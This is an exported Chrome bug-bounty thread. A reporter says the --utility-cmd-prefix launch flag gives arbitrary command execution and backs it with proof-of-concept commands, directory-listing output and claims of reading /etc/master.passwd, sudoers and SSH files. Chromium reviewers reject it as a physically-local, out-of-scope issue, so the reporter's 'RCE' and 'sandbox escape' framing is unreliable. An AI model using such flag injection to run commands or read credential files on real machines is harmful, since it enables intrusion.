@@ -1,0 +1,275 @@
+Issue ID: 464589786
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Arbitrary Command Execution via <code>--utility-cmd-prefix</code> in Chrome</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>Google Chrome Version 142.0.7444.176 (Official Build) (x86_64)</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<h2>Summary</h2>
+<p>Chrome’s <code>--utility-cmd-prefix</code> flag enables <strong>arbitrary command execution</strong> outside the sandbox — without user interaction.</p>
+<p>This debug-only flag allows prepending arbitrary binaries or shell commands to the execution of Chrome utility subprocesses (<code>Google Chrome Helper</code>, etc). Since it is available in <strong>production/stable builds</strong>, it directly violates Chrome&#39;s intended security boundaries and enables arbitrary command execution that can be used for <strong>persistence, sandbox escape chaining, and lateral movement</strong>.</p>
+<h2>PoC 1 — Launch Calculator.app</h2>
+<pre><code>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+  <span class="stx-string">&quot;--utility-cmd-prefix=/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> \
+  http://google.com &amp;
+</code></pre>
+<p>Result: Chrome spawns <code>Calculator.app</code>, proving arbitrary binary execution.</p>
+<h2>PoC 2 — Arbitrary Shell Command Execution</h2>
+<pre><code>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+  <span class="stx-string">&quot;--utility-cmd-prefix=touch /tmp/crash_test&quot;</span> \
+  http://google.com &amp;
+
+<span class="stx-comment"># Wait and verify:</span>
+sleep <span class="stx-number">3</span>
+ls -la /tmp/crash_test <span class="stx-number">2</span>&gt;/dev/null
+</code></pre>
+<p>Result: The file <code>/tmp/crash_test</code> is created.</p>
+<h2>PoC 3 - Launch Notes.app</h2>
+<pre><code>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome <span class="stx-string">&quot;--utility-cmd-prefix=/System/Applications/Notes.app/Contents/MacOS/Notes&quot;</span> http://google.com &amp;
+</code></pre>
+<p>Results: Chrome spawns <code>Notes</code>, proving arbitrary binary execution.</p>
+<p><strong>Note:</strong> These pocs might not work when you try them multiple or for the second time. You will need to restart your Mac and try again.</p>
+<h2>Why This Is a Security Issue</h2>
+<ul>
+<li>It allows <strong>pre-sandbox</strong> command execution</li>
+<li>It enables arbitrary code execution</li>
+</ul>
+<p>This breaks Chrome&#39;s security boundary and trust model. An attacker with control over launch arguments (even without root) can exploit this to execute code outside the sandbox.</p>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<ul>
+<li>Arbitrary code execution as the current user</li>
+<li>Execution is <strong>outside the Chrome sandbox</strong></li>
+<li>Can be abused in:
+<ul>
+<li>MDM-managed environments</li>
+<li>Misconfigured launch contexts (e.g. when Chrome is auto-launched by privileged apps)</li>
+<li>Any scenario where attacker controls Chrome launch arguments</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Version 142.0.7444.176 (Official Build) (x86_64)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>Yes, it is related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Remote Code Execution (RCE)</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Sean Geofrey sani</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ok...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ok...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ok...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: ok...@gmail.com
+<p>these are the crashes that im seeing during that process. I think code execution happens during the crash. &quot;[23260:3696384:1128/224835.722251:ERROR:content/browser/network_service_instance_impl.cc:613] Network service crashed, restarting service.
+[23260:3696384:1128/224835.891732:ERROR:content/browser/network_service_instance_impl.cc:613] Network service crashed, restarting service.
+[23260:3696384:1128/224835.942704:ERROR:content/browser/network_service_instance_impl.cc:613] Network service crashed, restarting service.
+[23260:3696384:1128/224836.002976:ERROR:content/browser/network_service_instance_impl.cc:613] Network service crashed, restarting service.
+[23260:3696384:1128/224836.036019:ERROR:content/browser/network_service_instance_impl.cc:613] Network service crashed, restarting service.&quot;</p>
+
+Author: ok...@gmail.com
+<h2>Why we are Seeing Crashes in <code>network_service_instance_impl.cc</code></h2>
+<p>When we run these payloads:</p>
+<pre><code>--utility-cmd-prefix=touch /tmp/crash_test
+</code></pre>
+<p>Here’s what we think is happening under the hood:</p>
+<ol>
+<li>
+<p>Chrome wants to start the <strong>Network Service</strong>.</p>
+</li>
+<li>
+<p>Instead of launching the real helper binary, it runs:</p>
+<pre><code>touch /tmp/crash_test --type=utility --utility-sub-type=network.mojom.NetworkService ...
+</code></pre>
+</li>
+<li>
+<p><code>touch</code> executes (my payload runs), but then it <strong>fails</strong> due to unrecognized arguments.</p>
+</li>
+<li>
+<p>The process exits immediately.</p>
+</li>
+<li>
+<p><code>network_service_instance_impl.cc</code> logs the crash and restarts the service:</p>
+<pre><code>Network service crashed, restarting service.
+</code></pre>
+</li>
+<li>
+<p>This loop continues — and our payload executes <strong>every time</strong>.</p>
+</li>
+</ol>
+<hr>
+<h2>Summary of What <code>network_service_instance_impl.cc</code> Does</h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>StartNetworkService()</code></td>
+<td>Launches the network service (utility process)</td>
+</tr>
+<tr>
+<td><code>OnNetworkServiceCrash()</code></td>
+<td>Handles crash detection and auto-restart logic</td>
+</tr>
+<tr>
+<td><code>GetNetworkService()</code></td>
+<td>Returns the singleton instance, spawns if needed</td>
+</tr>
+<tr>
+<td>Crash logging (line 613)</td>
+<td>Logs when the process crashes or exits unexpectedly</td>
+</tr>
+</tbody>
+</table>
+<hr>
+
+Author: ok...@gmail.com
+T0RJMU1URTBNVEk1T0RjNVlUSmpORGt4WWpJME1EbGpNelZpTmpkaE5XST0=
+
+Author: I ran:
+
+```bash
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+  "--utility-cmd-prefix=ls -la /Library/Preferences/" \
+  http://google.com
+```
+
+###  Result:
+
+* Chrome attempted to spawn a utility subprocess for something like networking or storage.
+* Instead of launching the expected Chrome binary, it **ran**:
+
+  ```bash
+  ls -la /Library/Preferences/ --type=utility --utility-sub-type=network.mojom.NetworkService ...
+  ```
+* `ls` happily executed and dumped the contents of a **sensitive system directory**.
+* Any unknown flag (`--type=utility`, etc.) is interpreted by `ls` as a filename → so `ls` created empty files with those names.
+
+
+# Sample output;
+
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome "--utility-cmd-prefix=ls -la /Library/Preferences/" http://google.com
+ls: --field-trial-handle=1718379636,r,4090394870073723564,11591367849075751176,262144: No such file or directory
+ls: --metrics-shmem-handle=1752395122,r,18116263666259865244,17976043634593871374,524288: No such file or directory
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --lang=en-US
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --service-sandbox-type=none
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --shared-files
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --trace-process-track-uuid=3190708989122997041
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --type=utility
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --utility-sub-type=network.mojom.NetworkService
+-rw-r--r--@ 1 sean  staff       0 Nov 29 02:24 --variations-seed-version=20251127-163025.747000
+-rwxrwxr-x@ 1 sean  admin  169952 Nov 29 02:24 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/142.0.7444.176/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper
+
+/Library/Preferences/:
+total 20944
+drwxr-xr-x  195 root         wheel           6240 Nov 29 04:42 .
+drwxr-xr-x   67 root         wheel           2144 Nov 20 01:11 ..
+-rw-r--r--@   1 root         wheel            563 Nov 20 01:12 .GlobalPreferences.plist
+drwxrwxr-x    5 root         _coreaudiod      160 Nov 20 01:11 Audio
+drwxr-xr-x    2 root         wheel             64 Nov 20 01:11 DirectoryService
+drwxr-xr-x    4 root         wheel            128 Nov 29 03:17 Logging
+drwxr-xr-x    5 root         wheel            160 Nov 20 01:11 OpenDirectory
+drwxr-xr-x   16 root         admin            512 Nov 29 04:23 SystemConfiguration
+drwxr-xr-x    2 root         wheel             64 Nov 20 01:11 Xsan
+-rw-r--r--@   1 root         wheel            180 Jul 13 19:12 com.apple.AppleFileServer.plist
+-rw-r--r--    1 _assetcache  _assetcache      704 Jul 13 19:13 com.apple.AssetCache.plist
+-rw-r--r--@   1 root         wheel             85 Jul 13 19:13 com.apple.BezelServices.plist
+-rw-r--r--    1 root         wheel            418 Oct 25 06:22 com.apple.ByteRangeLocking.plist
+-rw-r--r--@   1 root         wheel             58 Oct 30 14:40 com.apple.FindMyMac.plist
+-rw-r--r--@   1 root         wheel            365 Jul 13 19:14 com.apple.HIToolbox.plist
+-rw-r--r--    1 root         wheel             86 Nov 29 03:18 com.apple.MCX.plist
+-rw-r--r--    1 root         wheel           4115 Oct 25 06:22 com.apple.P2PSupervisor.plist
+-rw-r--r--@   1 root         wheel            588 Nov 29 04:41 com.apple.PowerManagement.5556A43E-E6EE-5415-A069-775A26D70F28.plist
+-rw-r--r--@   1 root         wheel            370 Sep 24 20:31 com.apple.PowerManagement.plist
+-rw-r--r--@   1 root         wheel           1364 Nov 29 03:18 com.apple.SoftwareUpdate.plist
+-rw-r--r--@   1 root         wheel             69 Nov 20 01:28 com.apple.TimeMachine.plist
+-rw-r--r--    1 root         wheel            336 Oct 25 06:22 com.apple.airport.opproam.plist
+-rw-r--r--@   1 root         wheel              0 Jul 13 19:12 com.apple.apsd.launchd
+-rw-------    1 root         wheel          49647 Nov 29 04:11 com.apple.apsd.plist
+-rw-r--r--@   1 root         wheel          37374 Nov 29 04:11 com.apple.biometrickitd.plist
+-rw-r--r--@   1 root         wheel            217 Jul 19 16:03 com.apple.bluetooth.plist
+-rw-r--r--    1 root         wheel             61 Sep 26 15:02 com.apple.captive.plist
+-rw-r--r--@   1 root         wheel            108 Jul 13 19:12 com.apple.dock.plist
+-rw-r--r--@   1 root         wheel             80 Jul 13 19:13 com.apple.driver.AppleIRController.plist
+-rw-r--r--@   1 root         wheel            249 Nov 21 23:55 com.apple.gridDataServices.plist
+-rw-r--r--@   1 root         wheel             83 Sep  1 01:36 com.apple.iclouddrive.features.plist
+-rw-r--r--@   1 root         wheel             79 Jul 13 22:18 com.apple.keyboardtype.plist
+-rw-r--r--@   1 root         wheel            280 Nov 29 03:18 com.apple.loginwindow.plist
+-rw-r--r--@   1 root         wheel             77 Jul 13 19:13 com.apple.mdmclient.plist
+-rw-r--r--    1 root         wheel            434 Nov 29 02:55 com.apple.networkd.networknomicon.plist
+-rw-r--r--    1 root         wheel           2679 Nov 25 19:46 com.apple.networkd.plist
+-rw-r--r--    1 root         wheel            436 Jul 15 16:46 com.apple.networkd.sysctl.plist
+-rw-r--r--    1 root         wheel            731 Oct 10 19:16 com.apple.networkextension.cache.plist
+-rw-r--r--    1 root         wheel            800 Nov 29 03:17 com.apple.networkextension.control.plist
+-rw-r--r--    1 root         wheel            241 Nov 29 03:17 com.apple.networkextension.necp.plist
+-rw-r--r--    1 root         wheel          54904 Nov 29 03:17 com.apple.networkextension.plist
+-rw-r--r--    1 root         wheel          18447 Nov 29 04:35 com.apple.networkextension.uuidcache.plist
+-rw-r--r--@   1 root         wheel             85 Nov 28 18:33 com.apple.noticeboard.plist
+-rw-r--r--@   1 root         wheel            103 Nov 27 16:37 com.apple.powerlogHelperd.plist
+T0RJMU1URTBNVEk1T0RjNVlUSmpORGt4WWpJME1EbGpNelZpTmpkaE5XST0=
+
+Author: ok...@gmail.com
+<p>I was also able to read he full contents of /etc/, including:</p>
+<p>/etc/master.passwd</p>
+<p>/etc/sudoers</p>
+<p>/etc/krb5.keytab</p>
+<p>/etc/ssh/*</p>
+
+Author: ok...@gmail.com
+TkRZME5UZzVOemcyTFRjeE16WXhOekExTFRNeU1EWXpORGN4Tmc9PQ==
+
+Author: ar...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@chromium.org
+public_non_google
+
+Author: ar...@chromium.org
+<p>Thank you for your report.</p>
+<p>We have reviewed your submission regarding the <code>--utility-cmd-prefix</code> flag. The ability to pass command-line flags to Chrome is not considered a security boundary. These flags are intended features for developers and testers to debug and configure the browser.</p>
+<p>An attacker who has the ability to launch Chrome with arbitrary flags (such as <code>--utility-cmd-prefix</code>) is already in a position to execute arbitrary code with the user&#39;s privileges, simply by executing the payload command directly. As such, this report falls under the category of <strong>physically-local attacks</strong>, which are outside of Chrome&#39;s threat model.</p>
+<p>For more information, please refer to the &quot;Why aren&#39;t physically-local attacks in Chrome&#39;s threat model?&quot; section of the <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23why-arent-physically_local-attacks-in-chromes-threat-model&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3DUL3-W8nSs6ja8E1P2Viz">Chrome Security FAQ</a>.</p>
+<p>We will be closing this issue as <strong>WontFix</strong> (Intended Behavior).</p>
+
+Author: ar...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
